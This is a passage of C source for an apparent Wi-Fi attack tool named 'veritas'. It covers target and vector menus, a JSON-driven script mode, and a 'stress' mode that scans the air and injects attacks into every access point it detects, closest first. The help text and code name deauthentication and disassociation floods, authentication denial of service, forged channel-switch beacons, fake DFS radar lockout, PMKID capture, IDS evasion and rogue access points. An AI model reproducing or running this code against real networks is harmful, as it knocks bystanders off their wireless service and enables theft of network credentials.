        snprintf(band, sizeof(band), "%.7s", p);
    }

    int dur = (strcmp(band, "a") == 0 || strcmp(band, "abg") == 0) ? 15 : 10;
    printf("\n  Scanning (%s, %ds)...\n\n", band, dur);
    n = scan_aps(iface, dur, aps, MAX_APS, band);
  }

  if (n == 0) {
    char b[MAX_MAC_STR], s[MAX_SSID_LEN + 1], c[8];
    input_prompt("BSSID", b, sizeof(b), vmc, "Invalid MAC", "");
    input_prompt("SSID", s, sizeof(s), NULL, "Required", "");
    input_prompt("Channel", c, sizeof(c), vch, "Invalid (1-14/36-165)", "");
    snprintf(t->bssid, MAX_MAC_STR, "%s", b);
    snprintf(t->ssid, MAX_SSID_LEN + 1, "%s", s);
    t->channel = atoi(c);
    return;
  }

  int show = n > 25 ? 25 : n;
  printf("\n  " C_GRAY " #  BSSID              CH  PWR  ENC       SSID" RST
         "\n");
  printf("  " C_DIM_GRAY
         "────────────────────────────────────────────────────────" RST "\n");
  for (int i = 0; i < show; i++) {
    const char *pc = abs(aps[i].power) < 50
                         ? C_GREEN
                         : (abs(aps[i].power) < 70 ? C_YELLOW : C_RED);
    printf("  " C_CYAN "%2d" RST "  %-18s %3d  %s%4d" RST "  %-9s %s\n", i + 1,
           aps[i].bssid, aps[i].channel, pc, aps[i].power, aps[i].encryption,
           aps[i].ssid);
  }
  printf("   0 = Manual\n\n");

  while (1) {
    printf("  Select [0-%d]: ", show);
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    int s = atoi(buf);
    if (s == 0) {
      menu_target(iface, t);
      return;
    }
    if (s >= 1 && s <= show) {
      *t = aps[s - 1];
      return;
    }
  }
}

static void menu_vectors(config_t *c) {
  printf("\n  " C_CYAN BLD "Vector Selection" RST "\n\n");
  for (int i = 0; i < VEC_COUNT; i++)
    printf("  " C_CYAN "%2d" RST ". %s\n", i + 1, VEC_NAMES[i]);
  printf("   " C_AQUA "A" RST " = ALL\n\n");
  while (1) {
    char buf[128];
    printf("  Select [1,3,7 or 1-5 or A]: ");
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    char *p = buf;
    while (*p == ' ')
      p++;
    char *nl = strchr(p, '\n');
    if (nl)
      *nl = 0;
    if (*p == 'A' || *p == 'a') {
      for (int i = 0; i < VEC_COUNT; i++)
        c->vec_on[i] = true;
      c->nvec = VEC_COUNT;
      return;
    }
    bool sel[VEC_COUNT] = {0};
    bool ok = false;
    char *tk = strtok(p, ",");
    while (tk) {
      while (*tk == ' ')
        tk++;
      char *d = strchr(tk, '-');
      if (d) {
        *d = 0;
        int a = atoi(tk), b = atoi(d + 1);
        for (int x = a; x <= b; x++)
          if (x >= 1 && x <= VEC_COUNT) {
            sel[x - 1] = true;
            ok = true;
          }
      } else {
        int x = atoi(tk);
        if (x >= 1 && x <= VEC_COUNT) {
          sel[x - 1] = true;
          ok = true;
        }
      }
      tk = strtok(NULL, ",");
    }
    if (ok) {
      int cnt = 0;
      for (int i = 0; i < VEC_COUNT; i++) {
        c->vec_on[i] = sel[i];
        if (sel[i])
          cnt++;
      }
      c->nvec = cnt;
      return;
    }
  }
}

static attack_mode_t menu_mode(void) {
  printf("\n  " C_CYAN BLD "Aggressiveness" RST "\n\n");
  struct {
    int n;
    const char *nm;
    const char *c;
    const char *d;
  } m[] = {
      {1, "STEALTH", C_GREEN, "~20 pps"},  {2, "LOW", C_BLUE, "~50 pps"},
      {3, "MEDIUM", C_YELLOW, "~200 pps"}, {4, "HIGH", C_ORANGE, "~500 pps"},
      {5, "INSANE", C_RED, "~5000 pps"},
  };
  for (int i = 0; i < 5; i++)
    printf("  %s%d" RST ". %-8s  %s\n", m[i].c, m[i].n, m[i].nm, m[i].d);
  printf("\n");
  while (1) {
    char buf[16];
    printf("  Level [1-5] " C_GRAY "[3]" RST ": ");
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);
    char *p = buf;
    while (*p == ' ')
      p++;
    if (*p == '\n' || !*p)
      return MODE_MEDIUM;
    int s = atoi(p);
    if (s >= 1 && s <= 5) {
      if (s == 5) {
        printf(
            "\n  " C_YELLOW
            "[!] WARNING: INSANE mode requires maximum hardware TX power." RST
            "\n");
        printf("  " C_YELLOW "    If your Wi-Fi card does not support this, or "
                             "drops from monitor mode," RST "\n");
        printf("  " C_YELLOW
               "    the scanner will go blind and targets will not appear." RST
               "\n");
        printf("  " C_YELLOW "    Are you sure you want to proceed with INSANE "
                             "mode? (y/N): " RST);
        fflush(stdout);
        char conf[16];
        if (!fgets(conf, sizeof(conf), stdin) ||
            (conf[0] != 'y' && conf[0] != 'Y')) {
          printf("  " C_GREEN "    Returning to mode selection..." RST "\n\n");
          continue;
        }
      }
      return (attack_mode_t)s;
    }
  }
}

/* ============================================================
 *               JSON PARSER
 * ============================================================ */

static bool jstr(const char *j, const char *k, char *o, int sz) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  if (*p != '"')
    return false;
  p++;
  int i = 0;
  while (*p && *p != '"' && i < sz - 1) {
    if (*p == '\\' && *(p + 1))
      p++;
    o[i++] = *p++;
  }
  o[i] = 0;
  return true;
}

static bool jint(const char *j, const char *k, int *o) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  *o = atoi(p);
  return true;
}

static bool jdbl(const char *j, const char *k, double *o) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  *o = atof(p);
  return true;
}

/* [FIX 32] Boolean JSON parser */
static bool jbool(const char *j, const char *k, bool *o) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return false;
  p += strlen(s);
  while (*p && (*p == ' ' || *p == ':' || *p == '\t'))
    p++;
  if (strncmp(p, "true", 4) == 0) {
    *o = true;
    return true;
  }
  if (strncmp(p, "false", 5) == 0) {
    *o = false;
    return true;
  }
  
  if (*p == '1') {
    *o = true;
    return true;
  }
  if (*p == '0') {
    *o = false;
    return true;
  }
  return false;
}

static int jarr(const char *j, const char *k, char o[][64], int mx) {
  char s[128];
  snprintf(s, sizeof(s), "\"%s\"", k);
  const char *p = strstr(j, s);
  if (!p)
    return 0;
  p = strchr(p, '[');
  if (!p)
    return 0;
  p++;
  int n = 0;
  while (*p && *p != ']' && n < mx) {
    while (*p && *p != '"' && *p != ']')
      p++;
    if (*p != '"')
      break;
    p++;
    int i = 0;
    while (*p && *p != '"' && i < 63)
      o[n][i++] = *p++;
    o[n][i] = 0;
    if (*p == '"')
      p++;
    n++;
  }
  return n;
}

/* ============================================================
 *               SCRIPT MODE
 * ============================================================ */

/* [FIX 30,31,32] Script mode with validation + rogue + boolean parsing */
static void run_script(const char *path) {
  FILE *fp = fopen(path, "r");
  if (!fp) {
    printf(C_RED "[!] Cannot open: %s" RST "\n", path);
    exit(1);
  }
  fseek(fp, 0, SEEK_END);
  long sz = ftell(fp);
  fseek(fp, 0, SEEK_SET);
  char *j = malloc(sz + 1);
  if (!j) {
    fclose(fp);
    exit(1);
  }
  size_t nread = fread(j, 1, sz, fp);
  j[nread] = 0;
  fclose(fp);

  config_t cfg = {0};
  cfg.mode = MODE_MEDIUM;
  cfg.new_ch = 1;
  snprintf(cfg.client, sizeof(cfg.client), "ff:ff:ff:ff:ff:ff");
  cfg.refresh_rate = 0.1;
  target_ap_t tgt = {0};

  if (!jstr(j, "interface", cfg.iface, MAX_IFACE)) {
    printf(C_RED "[!] 'interface' required" RST "\n");
    free(j);
    exit(1);
  }
  jstr(j, "target_bssid", tgt.bssid, MAX_MAC_STR);
  jstr(j, "target_ssid", tgt.ssid, MAX_SSID_LEN + 1);
  jint(j, "target_channel", &tgt.channel);
  if (!tgt.channel)
    tgt.channel = 6;
  jint(j, "new_channel", &cfg.new_ch);
  jstr(j, "client_mac", cfg.client, MAX_MAC_STR);
  jint(j, "duration", &cfg.duration);
  jdbl(j, "refresh_rate", &cfg.refresh_rate);
  jstr(j, "stats_file", cfg.stats_file, MAX_PATH_LEN);
  jstr(j, "iface2", cfg.iface2, MAX_IFACE);

  bool script_stress = false, script_5ghz = false, script_unmask = false;
  jbool(j, "stress_mode", &script_stress);
  jbool(j, "scan_5ghz", &script_5ghz);
  jbool(j, "unmask_hidden", &script_unmask);

  if (script_stress) {
    stress_cfg_t scfg = {0};
    snprintf(scfg.iface, MAX_IFACE, "%.31s", cfg.iface);
    scfg.scan_5ghz = script_5ghz;
    scfg.unmask_hidden = script_unmask;
    scfg.duration = cfg.duration;
    scfg.mode = MODE_MEDIUM;

    char ms[32];
    if (jstr(j, "mode", ms, sizeof(ms))) {
      for (char *p = ms; *p; p++)
        *p = toupper(*p);
      for (int i = 1; i <= 5; i++)
        if (strcmp(ms, MODE_NAMES[i]) == 0)
          scfg.mode = (attack_mode_t)i;
    }

    char vn[VEC_COUNT][64];
    int nv = jarr(j, "vectors", vn, VEC_COUNT);
    for (int i = 0; i < nv; i++)
      for (int v = 0; v < VEC_COUNT; v++)
        if (strcmp(vn[i], VEC_NAMES[v]) == 0) {
          scfg.vec_on[v] = true;
          scfg.nvec++;
        }
    if (!scfg.nvec) {
      scfg.vec_on[VEC_DEAUTH_FLOOD] = true;
      scfg.vec_on[VEC_DISASSOC_FLOOD] = true;
      scfg.vec_on[VEC_CSA_BEACON] = true;
      scfg.vec_on[VEC_AUTH_DOS] = true;
      scfg.nvec = 4;
    }
    free(j);
    run_stress(&scfg);
    return;
  }

  /* [FIX 32] Boolean options from JSON */
  jbool(j, "log_pmkid", &cfg.log_pmkid);
  jbool(j, "ids_bypass", &cfg.ids_bypass);
  jbool(j, "dual_radio", &cfg.dual_radio);
  jbool(j, "spawn_rogue", &cfg.spawn_rogue);
  jstr(j, "rogue_ssid", cfg.rogue_ssid, MAX_SSID_LEN + 1);

  /* [FIX 31] Validate inputs */
  if (tgt.bssid[0] && !valid_mac(tgt.bssid)) {
    printf(C_RED "[!] Invalid target_bssid: '%s'" RST "\n", tgt.bssid);
    free(j);
    exit(1);
  }
  if (cfg.client[0] && strcmp(cfg.client, "ff:ff:ff:ff:ff:ff") != 0 &&
      !valid_mac(cfg.client)) {
    printf(C_RED "[!] Invalid client_mac: '%s'" RST "\n", cfg.client);
    free(j);
    exit(1);
  }
  if (!valid_ch(cfg.new_ch)) {
    printf(C_RED "[!] Invalid new_channel: %d" RST "\n", cfg.new_ch);
    free(j);
    exit(1);
  }

  char vn[VEC_COUNT][64];
  int nv = jarr(j, "vectors", vn, VEC_COUNT);
  for (int i = 0; i < nv; i++)
    for (int v = 0; v < VEC_COUNT; v++)
      if (strcmp(vn[i], VEC_NAMES[v]) == 0) {
        cfg.vec_on[v] = true;
        cfg.nvec++;
      }
  if (!cfg.nvec) {
    cfg.vec_on[0] = true;
    cfg.nvec = 1;
  }

  char ms[32];
  if (jstr(j, "mode", ms, sizeof(ms))) {
    for (char *p = ms; *p; p++)
      *p = toupper(*p);
    for (int i = 1; i <= 5; i++)
      if (strcmp(ms, MODE_NAMES[i]) == 0)
        cfg.mode = (attack_mode_t)i;
  }
  free(j);

  printf("  " C_CYAN "[SCRIPT] %s → %s ch%d→%d %s (%d vec)" RST "\n", path,
         tgt.bssid, tgt.channel, cfg.new_ch, MODE_NAMES[cfg.mode], cfg.nvec);

  /* [FIX 46] DFS redirect info */
  if (is_dfs_ch(cfg.new_ch))
    printf("  " C_YELLOW
           "[DFS] Redirect to DFS ch %d — extended DoS via CAC delay" RST "\n",
           cfg.new_ch);
  if (cfg.vec_on[VEC_DFS_FAKE_RADAR]) {
    if (is_dfs_ch(tgt.channel))
      printf("  " C_YELLOW
             "[OCA] Target ch %d is DFS — Fake Radar can force CAC/"
             "Non-Occupancy lockout" RST "\n",
             tgt.channel);
    else
      printf("  " C_YELLOW
             "[OCA] Target ch %d is non-DFS — Fake Radar still injects "
             "Measurement Report + vacate CSA" RST "\n",
             tgt.channel);
  }

  set_ch(cfg.iface, tgt.channel);
  usleep_precise(0.3);

  factory_t fac;
  if (!factory_build(&fac, &tgt, cfg.new_ch, cfg.client))
    exit(1);
  engine_t eng;
  engine_init(&eng, &cfg, &fac);

  /* [FIX 30] Start rogue AP in script mode */
  start_rogue(&cfg, &tgt);

  g_start_time = mono_time();
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);

  pthread_t ch_t = start_ch_lock(&cfg, tgt.channel);
  pthread_t cap_t = start_capture(&cfg, &tgt);
  pthread_t dsp_t = start_display(&cfg, &tgt, cfg.refresh_rate, cfg.stats_file);
  engine_start(&eng);

  if (cfg.duration > 0) {
    double end = mono_time() + cfg.duration;
    while (!g_stop && mono_time() < end)
      usleep_precise(0.5);
    g_stop = 1;
  } else {
    while (!g_stop)
      usleep_precise(0.5);
  }

  engine_stop(&eng);
  pthread_join(ch_t, NULL);
  pthread_join(cap_t, NULL);
  pthread_join(dsp_t, NULL);
  stop_rogue(cfg.iface2);
  print_summary(&cfg, &tgt);
}

/* ============================================================
 *               HELP
 * ============================================================ */

/* [FIX 40] --help handler */
static void print_help(void) {
  printf("%s\n", BANNER);
  printf("Usage:\n");
  printf("  sudo ./veritas                     Interactive mode (single "
         "target)\n");
  printf("  sudo ./veritas --stress            Stress test mode (mass "
         "injection)\n");
  printf("  sudo ./veritas --script <json>     Script/automated mode\n");
  printf("  sudo ./veritas --help              Show this help\n\n");
  printf("Options (interactive mode):\n");
  printf("  --pmkid         Enable PMKID capture\n");
  printf("  --ids-bypass    Enable IDS evasion (jittered injection)\n");
  printf("  -i, --iface <if> Primary monitor interface (Hunter)\n");
  printf("  --dual <iface>  Use dual radio (second monitor interface)\n");
  printf("  --rogue         Spawn rogue AP on redirect channel\n");
  printf("  --stats <file>  Write live stats JSON to file\n");
  printf("  --export <file> Export audit report to JSON or CSV on exit\n\n");
  printf("Stress test options:\n");
  printf(
      "  --stress        Mass injection mode — inject into ALL detected APs\n");
  printf("  --5ghz          Include 5GHz channels in stress scan/injection\n");
  printf("  --unmask-hidden Actively sweep Probe Requests to unmask hidden "
         "SSIDs\n");
  printf("  --split-role    Hunter-Killer architecture for dual radio "
         "(iface=Scanner, iface2=Injector)\n");
  printf("  --target-ssid   Filter stress injection to specific SSID(s) (supports "
         "wildcard '*'). Comma-separated.\n");
  printf("  --export <file> Export audit report (JSON/CSV) at session "
         "completion\n\n");
  printf("Script JSON keys:\n");
  printf(
      "  interface, target_bssid, target_ssid, target_channel, new_channel,\n");
  printf(
      "  client_mac, duration, mode, vectors[], refresh_rate, stats_file,\n");
  printf("  log_pmkid, ids_bypass, dual_radio, iface2, spawn_rogue, "
         "rogue_ssid,\n");
  printf("  stress_mode (bool), scan_5ghz (bool), unmask_hidden (bool), "
         "split_role (bool), export_file (string)\n\n");
}

/* ============================================================
 *        STRESS TEST MODE — mdk4-style Mass Injection
 *
 *  Injects selected attack vectors into ALL Wi-Fi signals
 *  captured from the air. No specific target required.
 *
 *  Architecture:
 *    Scanner Thread  → passive beacon sniffer → fills AP pool
 *    Hopper Thread   → cycles channels 2.4GHz (+5GHz)
 *    Injector Thread → for each AP in pool: build+inject OTF
 *    Display Thread  → live TUI with per-AP stats
 * ============================================================ */

#define STRESS_MAX_APS 128
#define STRESS_AGE_SEC 60.0


static const int CH_24[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
static const int CH_5[] = {36,  40,  44,  48,  52,  56,  60,  64,
                           100, 104, 108, 112, 116, 120, 124, 128,
                           132, 136, 140, 149, 153, 157, 161, 165};
#define N_CH_24 13
#define N_CH_5 24

typedef struct {
  uint8_t bssid[6];
  char bssid_str[MAX_MAC_STR];
  char ssid[MAX_SSID_LEN + 1];
  int channel;
  int8_t rssi;
  char encryption[16];
  double last_seen;
  _Atomic uint64_t tx_count;
} stress_ap_t;

typedef struct {
  stress_ap_t aps[STRESS_MAX_APS];
  int count;
  pthread_mutex_t lock;
} stress_pool_t;


static _Atomic int g_stress_ch[2] = {0, 0};
static _Atomic int g_stress_aps_seen = 0;

static void stress_pool_init(stress_pool_t *p) {
  memset(p, 0, sizeof(*p));
  pthread_mutex_init(&p->lock, NULL);
}

static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
                            const char *ssid, int channel, int8_t rssi,
                            const char *enc) {
  pthread_mutex_lock(&p->lock);

  
  for (int i = 0; i < p->count; i++) {
    if (memcmp(p->aps[i].bssid, bssid, 6) == 0) {
      p->aps[i].last_seen = mono_time();
      p->aps[i].channel = channel;
      if (rssi < 0 && rssi > -120)
        p->aps[i].rssi = rssi;
      if (enc && enc[0])
        snprintf(p->aps[i].encryption, sizeof(p->aps[i].encryption), "%.15s",
                 enc);
      if (ssid[0]) {
        if (!p->aps[i].ssid[0] || p->aps[i].ssid[0] == '<')
          snprintf(p->aps[i].ssid, MAX_SSID_LEN + 1, "%.32s", ssid);
      }
      pthread_mutex_unlock(&p->lock);
      return;
    }
  }

  
  if (p->count < STRESS_MAX_APS) {
    stress_ap_t *a = &p->aps[p->count];
    memcpy(a->bssid, bssid, 6);
    format_mac(bssid, a->bssid_str);
    snprintf(a->ssid, MAX_SSID_LEN + 1, "%.32s", ssid);
    a->channel = channel;
    a->rssi = rssi;
    snprintf(a->encryption, sizeof(a->encryption), "%.15s",
             enc && enc[0] ? enc : "OPN");
    a->last_seen = mono_time();
    atomic_store(&a->tx_count, 0);
    p->count++;
    atomic_store(&g_stress_aps_seen, p->count);
  }

  pthread_mutex_unlock(&p->lock);
}


static void stress_pool_age(stress_pool_t *p) {
  double now = mono_time();
  pthread_mutex_lock(&p->lock);
  int i = 0;
  while (i < p->count) {
    if (now - p->aps[i].last_seen > STRESS_AGE_SEC) {
      p->aps[i] = p->aps[p->count - 1];
      p->count--;
      atomic_store(&g_stress_aps_seen, p->count);
    } else {
      i++;
    }
  }
  pthread_mutex_unlock(&p->lock);
}


static int stress_pool_snapshot(stress_pool_t *p, stress_ap_t *out, int max) {
  pthread_mutex_lock(&p->lock);
  int n = p->count < max ? p->count : max;
  memcpy(out, p->aps, (size_t)n * sizeof(stress_ap_t));
  pthread_mutex_unlock(&p->lock);

  /* [UPGRADE] Sort by RSSI descending so we always attack closest targets first */
  for (int i = 0; i < n - 1; i++) {
    for (int j = 0; j < n - i - 1; j++) {
      if (out[j].rssi < out[j + 1].rssi) {
        stress_ap_t tmp = out[j];
        out[j] = out[j + 1];
        out[j + 1] = tmp;
      }
    }
  }
  return n;
}


static int8_t parse_radiotap_rssi(const uint8_t *buf, uint16_t rt_len) {
  if (rt_len < 8)
    return -100;
  uint32_t present = 0;
  memcpy(&present, buf + 4, 4);
  present = le32toh(present);

  int off = 8;
  uint32_t cur_p = present;
  while (cur_p & (1U << 31)) {
    if (off + 4 > (int)rt_len)
      return -100;
    memcpy(&cur_p, buf + off, 4);
    cur_p = le32toh(cur_p);
    off += 4;
  }

  if (present & (1 << 5)) { 
    if (present & (1 << 0)) {
      while (off % 8 != 0)
        off++;
      off += 8; 
    }
    if (present & (1 << 1))
      off += 1; 
    if (present & (1 << 2))
      off += 1; 
    if (present & (1 << 3)) {
      while (off % 2 != 0)
        off++;
      off += 4; 
    }
    if (present & (1 << 4)) {
      while (off % 2 != 0)
        off++;
      off += 2; 
    }
    if (off < (int)rt_len) {
      int8_t sig = (int8_t)buf[off];
      if (sig < 0 && sig > -120)
        return sig;
    }
  }
  return -100;
}

/* ---- Passive Beacon Scanner Thread ---- */

typedef struct {
  char iface[MAX_IFACE];
  stress_pool_t *pool;
  bool unmask_hidden;
  int radio_idx;
} stress_scan_arg_t;

static void *stress_scanner_thread(void *arg) {
  stress_scan_arg_t *a = (stress_scan_arg_t *)arg;
  int sock = raw_socket(a->iface);
  if (sock < 0) {
    free(a);
    return NULL;
  }

  struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

  
#ifndef PACKET_IGNORE_OUTGOING
#define PACKET_IGNORE_OUTGOING 23
#endif
  int igo = 1;
  setsockopt(sock, SOL_PACKET, PACKET_IGNORE_OUTGOING, &igo, sizeof(igo));

  /*
   * [FIX] Smart BPF Kernel-Level Filtering
   * Only pass Management frames (Type = 0) to user-space.
   * Radiotap length is at byte 2-3 in LITTLE ENDIAN. BPF_H is Big Endian,
   * so we must read bytes individually to construct the correct length.
   */
  struct sock_filter bpf_code[] = {
      
      BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 2),
      
      BPF_STMT(BPF_MISC | BPF_TAX, 0),
      
      BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 3),
      
      BPF_STMT(BPF_ALU | BPF_LSH | BPF_K, 8),
      
      BPF_STMT(BPF_ALU | BPF_ADD | BPF_X, 0),
      
      BPF_STMT(BPF_MISC | BPF_TAX, 0),

      
      BPF_STMT(BPF_LD | BPF_B | BPF_IND, 0),
      
      BPF_STMT(BPF_ALU | BPF_AND | BPF_K, 0x0C),
      
      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0, 0, 1),

      
      BPF_STMT(BPF_RET | BPF_K, ~0U),
      
      BPF_STMT(BPF_RET | BPF_K, 0),
  };
  struct sock_fprog bpf_prog = {
      .len = sizeof(bpf_code) / sizeof(bpf_code[0]),
      .filter = bpf_code,
  };
  if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_prog,
                 sizeof(bpf_prog)) < 0) {
    fprintf(stderr,
            "  " C_YELLOW "[!] Failed to attach BPF filter on %s, falling back "
                          "to user-space filtering" RST "\n",
            a->iface);
  }

  uint8_t buf[4096];
  
  #define MAX_HARVEST 32
  char harvest_pool[MAX_HARVEST][MAX_SSID_LEN + 1] = {0};
  int harvest_cnt = 0;
  double last_probe_time = mono_time();

  while (!g_stop) {
    
    if (a->unmask_hidden) {
      double now = mono_time();
      if (now - last_probe_time >= 1.0) {
        last_probe_time = now;
        uint8_t pb[256];
        
        
        int plen = mk_probe_req(pb, BCAST, NULL);
        inject_one(sock, pb, plen);
        
        
        for (int i = 0; i < harvest_cnt; i++) {
          if (harvest_pool[i][0]) {
            plen = mk_probe_req(pb, BCAST, harvest_pool[i]);
            inject_one(sock, pb, plen);
          }
        }
      }
    }

    ssize_t n = recv(sock, buf, sizeof(buf), 0);
    if (n <= 36)
      continue;


    
    uint16_t rt_len = 0;
    memcpy(&rt_len, buf + 2, 2);
    rt_len = le16toh(rt_len);
    dot11_t *d = (dot11_t *)(buf + rt_len);
    uint16_t fc = le16toh(d->fc);
    uint8_t type = (fc >> 2) & 0x03;
    uint8_t subtype = (fc >> 4) & 0x0F;

    
    if (type != 0)
      continue;

    if (subtype == 8 || subtype == 5) {
      
      uint8_t *bssid = d->a2;
      if (bssid[0] & 0x01)
        continue;

      int ie_off =
          rt_len + sizeof(dot11_t) + (subtype == 8 ? sizeof(beacon_fix_t) : 12);
      if (ie_off >= n)
        continue;

      char ssid[MAX_SSID_LEN + 1] = "";
      int channel = 0;

      uint16_t cap_info = 0;
      if (rt_len + sizeof(dot11_t) + 12 <= (size_t)n) {
        memcpy(&cap_info, buf + rt_len + sizeof(dot11_t) + 10, 2);
        cap_info = le16toh(cap_info);
      }

      char enc[16] = "OPN";
      if (cap_info & 0x0010)
        snprintf(enc, sizeof(enc), "WEP");

      while (ie_off + 2 <= (int)n) {
        uint8_t ie_id = buf[ie_off];
        uint8_t ie_len = buf[ie_off + 1];
        if (ie_off + 2 + ie_len > (int)n)
          break;

        if (ie_id == 0 && ie_len > 0 && ie_len <= MAX_SSID_LEN) {
          
          memcpy(ssid, buf + ie_off + 2, ie_len);
          ssid[ie_len] = 0;
          bool printable = true;
          for (int j = 0; j < ie_len; j++) {
            if (ssid[j] < 0x20 || ssid[j] > 0x7E) {
              printable = false;
              break;
            }
          }
          if (!printable)
            ssid[0] = 0;
        } else if (ie_id == 3 && ie_len == 1) {
          
          channel = buf[ie_off + 2];
        } else if (ie_id == 48 && ie_len >= 12) {
          
          snprintf(enc, sizeof(enc), "WPA2");
          const uint8_t *ie_ptr = buf + ie_off + 2;
          if (ie_len >= 8) {
            uint16_t pair_cnt = ie_ptr[6] | (ie_ptr[7] << 8);
            int akm_off = 8 + pair_cnt * 4;
            if (ie_len >= akm_off + 2) {
              uint16_t akm_cnt = ie_ptr[akm_off] | (ie_ptr[akm_off + 1] << 8);
              int akm_base = akm_off + 2;
              for (int av = 0; av < akm_cnt && akm_base + av * 4 + 4 <= ie_len;
                   av++) {
                const uint8_t *akm = ie_ptr + akm_base + av * 4;
                if (akm[0] == 0x00 && akm[1] == 0x0F && akm[2] == 0xAC &&
                    (akm[3] == 8 || akm[3] == 9 || akm[3] == 19)) {
                  snprintf(enc, sizeof(enc), "WPA3");
                  break;
                }
              }
            }
          }
        } else if (ie_id == 221 && ie_len >= 6) {
          
          const uint8_t *vp = buf + ie_off + 2;
          if (vp[0] == 0x00 && vp[1] == 0x50 && vp[2] == 0xF2 &&
              vp[3] == 0x02) {
            if (strcmp(enc, "WPA2") != 0 && strcmp(enc, "WPA3") != 0)
              snprintf(enc, sizeof(enc), "WPA");
          }
        }

        ie_off += 2 + ie_len;
      }

      if (!ssid[0]) {
        snprintf(ssid, sizeof(ssid), "<hidden>");
      }
      int8_t rssi = parse_radiotap_rssi(buf, rt_len);
      if (channel <= 0) {
        channel = atomic_load(&g_stress_ch[a->radio_idx]);
      }
      if (channel > 0) {
        stress_pool_add(a->pool, bssid, ssid, channel, rssi, enc);
      }
    } else if (subtype == 4) {
      
      int ie_off = rt_len + sizeof(dot11_t);
      if (ie_off >= n)
        continue;

      char ssid[MAX_SSID_LEN + 1] = "";
      while (ie_off + 2 <= (int)n) {
        uint8_t ie_id = buf[ie_off];
        uint8_t ie_len = buf[ie_off + 1];
        if (ie_off + 2 + ie_len > (int)n)
          break;

        if (ie_id == 0 && ie_len > 0 && ie_len <= MAX_SSID_LEN) {
          memcpy(ssid, buf + ie_off + 2, ie_len);
          ssid[ie_len] = 0;
          bool printable = true;
          for (int j = 0; j < ie_len; j++) {
            if (ssid[j] < 0x20 || ssid[j] > 0x7E) {
              printable = false;
              break;
            }
          }
          if (!printable)
            ssid[0] = 0;
          break;
        }
        ie_off += 2 + ie_len;
      }

      if (ssid[0]) {
        
        if (!(d->a3[0] & 0x01)) {
          int8_t rssi = parse_radiotap_rssi(buf, rt_len);
          stress_pool_add(a->pool, d->a3, ssid, 0, rssi, "");
        }
        
        
        if (a->unmask_hidden) {
          bool found = false;
          for (int i = 0; i < harvest_cnt; i++) {
            if (strncmp(harvest_pool[i], ssid, MAX_SSID_LEN) == 0) {
              found = true;
              break;
            }
          }
          if (!found && harvest_cnt < MAX_HARVEST) {
            snprintf(harvest_pool[harvest_cnt], MAX_SSID_LEN + 1, "%.32s", ssid);
            harvest_cnt++;
          }
        }
      }
    }

    
    static int age_counter = 0;
    if (++age_counter >= 500) {
      age_counter = 0;
      stress_pool_age(a->pool);
    }
  }

  close(sock);
  free(a);
  return NULL;
}

/* ---- Channel Hopper Thread ---- */

typedef struct {
  char iface[MAX_IFACE];
  int chlist[N_CH_24 + N_CH_5];
  int nch;
  int dwell_ms;
  int radio_idx;
} stress_hop_arg_t;

static void *stress_hopper_thread(void *arg) {
  stress_hop_arg_t *a = (stress_hop_arg_t *)arg;

  if (a->nch == 0) {
    free(a);
    return NULL;
  }

  int idx = 0;
  while (!g_stop) {
    int ch = a->chlist[idx % a->nch];
    set_ch(a->iface, ch);
    atomic_store(&g_stress_ch[a->radio_idx], ch);
    idx++;

    double dwell = (double)a->dwell_ms / 1000.0;
    usleep_precise(dwell);
  }

  free(a);
  return NULL;
}

/* [UPGRADE] Simple wildcard matching supporting '*' */
static bool wildcard_match(const char *pattern, const char *str) {
  if (*pattern == '\0') return *str == '\0';
  if (*pattern == '*') {
    if (*(pattern + 1) == '\0') return true;
    while (*str != '\0') {
      if (wildcard_match(pattern + 1, str)) return true;
      str++;
    }
    return false;
  }
  if (*str == '\0') return false;
  if (*pattern == *str) return wildcard_match(pattern + 1, str + 1);
  return false;
}

/* ---- Multi-Target Injector Thread ---- */

typedef struct {
  stress_cfg_t *cfg;
  stress_pool_t *pool;
  int band; 
  char iface[MAX_IFACE];
  int radio_idx;
} stress_inj_arg_t;

static void *stress_injector_thread(void *arg) {
  stress_inj_arg_t *a = (stress_inj_arg_t *)arg;

  int sock = raw_socket(a->iface);
  if (sock < 0) {
    free(a);
    return NULL;
  }

  xorshift64_t rng;
  xs64_seed(&rng);

  
  double base_sleep;
  switch (a->cfg->mode) {
  case MODE_STEALTH:
    base_sleep = 0.08;
    break;
  case MODE_LOW:
    base_sleep = 0.04;
    break;
  case MODE_MEDIUM:
    base_sleep = 0.015;
    break;
  case MODE_HIGH:
    base_sleep = 0.005;
    break;
  case MODE_INSANE:
    base_sleep = 0.001;
    break;
  default:
    base_sleep = 0.015;
    break;
  }

  uint16_t seq = 0;
  stress_ap_t snap[STRESS_MAX_APS];

  /* [FIX] Zero-Copy Packet Templating: Pre-build templates to avoid thousands
   * of mk_* calls per second */

  uint8_t tpl_auth[MAX_PKT_SIZE];
  int tpl_auth_len = 0;
  if (a->cfg->vec_on[VEC_AUTH_DOS]) {
    uint8_t dummy_bss[6] = {0};
    uint8_t dummy_cli[6] = {0};
    tpl_auth_len = mk_auth(tpl_auth, dummy_bss, dummy_cli);
